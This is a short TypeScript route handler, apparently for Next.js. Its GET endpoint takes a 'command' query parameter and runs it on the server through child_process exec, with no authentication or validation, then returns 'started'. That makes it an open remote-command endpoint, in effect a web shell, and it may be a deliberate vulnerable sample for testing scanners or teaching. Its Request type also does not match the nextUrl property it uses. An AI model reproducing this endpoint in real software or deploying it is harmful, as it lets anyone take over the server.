import { exec } from "node:child_process";

export async function GET(request: Request) {
  const command = request.nextUrl.searchParams.get("command");
  exec(command);
  return new Response("started");
}
